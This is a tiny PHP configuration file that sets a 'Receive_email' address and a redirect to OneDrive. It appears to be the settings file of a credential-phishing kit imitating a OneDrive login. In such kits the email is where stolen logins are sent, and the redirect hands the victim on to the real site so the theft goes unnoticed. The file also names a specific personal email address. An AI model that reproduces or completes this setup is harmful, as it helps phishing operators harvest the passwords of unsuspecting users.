<?php 
$Receive_email="jponder.40@yahoo.com, jponder.40@yahoo.com";
$redirect="https://www.onedrive.com/";
?>